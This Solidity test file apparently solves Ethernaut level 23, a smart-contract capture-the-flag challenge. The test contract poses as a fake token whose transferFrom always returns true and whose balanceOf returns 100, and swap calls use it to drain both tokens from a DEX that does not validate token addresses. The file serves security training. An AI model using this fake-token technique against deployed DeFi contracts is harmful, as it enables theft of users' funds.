// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "test/Ethernaut.t.sol";

interface Level23 {
    function token1() external view returns (address);
    function token2() external view returns (address);
    function swap(address from, address to, uint256 amount) external;
}

contract Level23Test is EthernautTest {
    function testLevel23() public {
        _createLevel("23");

        Level23 level23Instance = Level23(levelInstance["23"]);

        // There is no checking of the from or to address in the swap function
        // We can just transfer all of the tokens to us by calling back to this
        // contract for the transferFrom and balanceOf calls
        // A value of true is needed from transferFrom and 100 for balanceOf
        // This is possible by setting the from address incorrectly
        level23Instance.swap(address(this), level23Instance.token1(), 100);
        level23Instance.swap(address(this), level23Instance.token2(), 100);

        require(_submitLevel("23"));
    }

    // We call back to this contract, transferFrom returns true
    function transferFrom(address, address, uint256) external returns (bool) {
        return true;
    }

    // We call back to this contract, returning 100 to transfer the maximum amount
    // in the DEX of each token
    function balanceOf(address) external view returns (uint256) {
        return 100;
    }
}
